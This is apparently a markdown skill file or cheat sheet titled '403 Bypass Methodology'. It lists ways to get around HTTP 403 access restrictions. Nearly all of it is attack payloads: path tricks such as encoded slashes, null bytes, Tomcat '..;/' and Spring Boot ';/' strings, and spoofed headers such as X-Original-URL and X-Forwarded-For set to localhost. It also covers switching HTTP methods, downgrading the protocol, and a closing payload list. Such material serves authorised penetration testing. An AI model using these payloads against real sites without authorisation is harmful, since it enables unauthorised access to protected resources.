---
name: 403-bypass
description: 403 forbidden bypass techniques via path manipulation, headers, HTTP method changes, and protocol downgrade
category: vulnerabilities
---

# 403 Bypass Methodology

## Directory-Based Bypass
```
site.com/secret      → 403
site.com/secret/*    → 200
site.com/secret/./   → 200
site.com/secret//    → 200
site.com/./secret/   → 200
site.com/secret%23   → 200 (URL fragment)
site.com/secret?     → 200
site.com/secret??    → 200
site.com/secret.html → 200
site.com/secret..;/  → 200 (Tomcat)
site.com/;/secret    → 200 (Spring Boot)
```

## File-Based Bypass
```
site.com/secret.txt   → 403
site.com/secret.txt/  → 200
site.com/%2f/secret.txt/ → 200
site.com/secret.txt%00 → 200 (null byte)
site.com/secret.txt~  → 200 (backup file)
site.com/secret.txt.bak → 200
```

## Protocol-Based Bypass
```
https://site.com/secret → 403
http://site.com/secret  → 200
http://site.com:443/secret → different behavior
```

## Header-Based Bypass
```
X-Original-URL: /secret
X-Rewrite-URL: /secret
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: localhost
X-Custom-IP-Authorization: 127.0.0.1
X-Auth-Type: None
```

## HTTP Methods Bypass
```
GET /secret      → 403
POST /secret     → 200
PUT /secret      → 200
OPTIONS /secret  → reveals allowed methods
PATCH /secret    → 200
```

## Common Payloads
```
/, /*, /%2f/, /./, ./., /*/, /..;/,
/%2e%2e/, /%00, /%20, /%09, /%23,
site.com/secret (different case)
```
